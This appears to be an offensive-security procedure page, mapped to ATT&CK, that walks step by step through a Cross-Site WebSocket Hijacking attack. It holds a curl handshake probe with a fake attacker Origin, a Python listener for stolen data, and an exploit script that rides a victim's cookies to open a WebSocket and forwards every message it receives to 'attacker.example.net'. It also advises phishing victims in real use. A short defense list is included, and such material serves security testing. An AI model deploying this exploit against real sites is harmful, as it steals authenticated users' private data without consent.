---
type: procedure
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
  - '[[tags/Cross-Site WebSocket Hijacking (CSWSH)]]'
  - '[[tags/Web Sockets]]'
commands:
  - '[[commands/curl-test-websocket-origin-validation]]'
  - '[[commands/npm-install-ws]]'
  - '[[commands/python-start-http-server]]'
platforms:
  - Web
tools: []
verified: true
validated: true
---

# Perform-Cross-Site-WebSocket-Hijacking

## Summary

This procedure demonstrates how to perform a Cross-Site WebSocket Hijacking (CSWSH) attack by exploiting WebSocket endpoints that fail to validate the Origin header during the handshake. An attacker hosts a malicious webpage that, when visited by an authenticated victim, automatically establishes a WebSocket connection to the target server using the victim's cookies, allowing the interception of messages or injection of unauthorized commands for data exfiltration or control.

## Description

WebSockets enable real-time bidirectional communication but inherit some browser behaviors from HTTP, such as automatic inclusion of cookies in cross-origin requests. Unlike XMLHttpRequest or Fetch, WebSocket handshakes are not strictly bound by the same-origin policy, making them vulnerable to CSRF-like attacks if the server does not check the Origin header. In a CSWSH attack, the attacker tricks the victim into loading a malicious script on their site, which initiates a WebSocket connection to the target's endpoint. Since the victim is authenticated, the connection succeeds, and the attacker can read responses or send messages. This is particularly effective against applications using WebSockets for chat, notifications, or real-time data where sensitive information is exchanged. The procedure includes setting up a vulnerable test server for lab validation, crafting the exploit, and verifying exfiltration.

## Requirements

1. Node.js installed on the attacker's machine for setting up a test vulnerable server.
2. Python 3 installed for hosting the malicious page and receiving exfiltrated data.
3. Knowledge of the target's WebSocket endpoint URL (e.g., ws://target.com/ws or wss:// for secure).
4. Control over a domain or local network to host the malicious page and exfiltration endpoint.
5. Victim must be authenticated to the target application and visit the attacker's page.

## Defense

- Implement strict Origin header validation on the WebSocket server, rejecting connections from untrusted domains.
- Use Sec-WebSocket-Protocol subprotocols with CSRF tokens or nonces during handshake negotiation.
- Enforce authentication beyond cookies, such as JWT tokens passed in custom headers post-handshake.
- Monitor for anomalous WebSocket connections from cross-origin sources and unexpected message patterns.

## Objectives

1. Hijack an active WebSocket session to exfiltrate sensitive messages from the target server.
2. Inject unauthorized messages via the victim's connection to manipulate server state or perform actions.
3. Demonstrate the vulnerability in a lab environment to validate detection and mitigation.

## Instructions

### Step 1: Install Node.js WebSocket Library

**Context**: Install the 'ws' package to set up a vulnerable WebSocket server for testing the CSWSH attack in a controlled lab environment. This simulates a target application without Origin validation.

**Command** ([[commands/npm-install-ws]]):
```bash
npm install --save ws
```

> This command installs the ws library locally. Run it in an empty directory where you'll create the server script. Expected output includes confirmation of package installation and updates to package.json.

### Step 2: Set Up Vulnerable WebSocket Server

**Context**: Create and run a basic Node.js WebSocket server that accepts connections without validating the Origin header, allowing cross-site hijacking. This step combines server initialization and message handling for a complete test endpoint that logs incoming messages and sends a response containing simulated sensitive data.

First, include the server initialization:

**Code** ([[codes/NodeJS-WebSocket-Server-Creation]]):
```javascript
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });
```

Then, add the connection handler:

**Code** ([[codes/NodeJS-WebSocket-Message-Handler]]):
```javascript
wss.on('connection', function connection(ws) {
  ws.on('message', function incoming(message) {
    console.log('received: %s', message);
  });
  ws.send('something');
});
```

> Combine these in a file named server.js (e.g., paste initialization first, then handler). Run with `node server.js`. The server listens on port 8080. Expected output: No errors, console shows 'received: %s' for incoming messages, and clients receive 'something' response. Connect a legitimate client first to authenticate/simulate (e.g., via browser console: new WebSocket('ws://localhost:8080')). This setup is vulnerable because it lacks Origin checks.

### Step 3: Test WebSocket Handshake and Origin Validation

**Context**: Verify the server's WebSocket endpoint accepts handshakes from a cross-origin Origin, confirming vulnerability to CSWSH. Include Sec-WebSocket-Protocol to test subprotocol handling if used by the target.

**Command** ([[commands/curl-test-websocket-origin-validation]]):
```bash
curl --include \
     --no-buffer \
     --header "Connection: Upgrade" \
     --header "Upgrade: websocket" \
     --header "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" \
     --header "Sec-WebSocket-Version: 13" \
     --header "Sec-WebSocket-Protocol: chat" \
     --header "Origin: http://evil.attacker.com" \
     http://localhost:8080/
```

> This performs the HTTP upgrade handshake from a fake cross-origin. Expected output: HTTP/1.1 101 Switching Protocols, Sec-WebSocket-Accept header, and possibly Sec-WebSocket-Protocol: chat echoed back. If rejected (e.g., 400/403), the server validates Origin— not vulnerable. Success confirms the endpoint can be hijacked.

### Step 4: Start Exfiltration Receiver Server

**Context**: Set up a simple HTTP server on the attacker's machine to capture exfiltrated data sent via the malicious script's fetch request. Python's built-in server logs all incoming requests, including query parameters with stolen data.

**Command** ([[commands/python-start-http-server]]):
```bash
python3 -m http.server 9000
```

> Run this in a separate terminal on the attacker machine (use port 9000 to avoid conflict). Expected output: Server logs like 'GET /?sensitive=data HTTP/1.1' from 127.0.0.1 when data is exfiltrated. This captures the victim's WebSocket responses.

### Step 5: Craft and Host the Malicious Exploit Page

**Context**: Create an HTML page embedding the JavaScript that hijacks the WebSocket. When loaded, it connects to the target using the victim's cookies, sends a test message, and exfils any received data to the attacker's server.

**Code** ([[codes/CSWSH-Exploit-Malicious-Script]]):
```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

> Save this as index.html in a directory. For lab testing, replace 'wss://vulnerable.example.com/messages' with 'ws://localhost:8080' and 'https://attacker.example.net' with 'http://localhost:9000'. The script auto-sends cookies, hijacks the connection, and forwards messages via no-cors fetch to evade SOP.

Host the page:

**Command** ([[commands/python-start-http-server]]):
```bash
python3 -m http.server 8000
```

> Run in the directory containing index.html. Expected output: Server starts, logs accesses. Visit http://localhost:8000 in a browser where the victim is 'authenticated' (e.g., prior legitimate WS connection open).

### Step 6: Execute the Attack and Verify Exfiltration

**Context**: Simulate the victim visiting the malicious page while authenticated to the target. Monitor the receiver for exfiltrated data.

Open http://localhost:8000 in the browser. The script connects to ws://localhost:8080, sends 'HELLO' and 'Some text sent to the server', receives 'something', and fetches http://localhost:9000/?something.

> Expected output: Target server console logs received messages. Exfil server logs the GET with ?something. Success: Data exfiltrated without victim interaction, confirming hijack. In real scenarios, use phishing to lure the victim.

Decision point: If no exfil, check browser console for WS errors (e.g., Origin rejected) or adjust URLs/protocols.
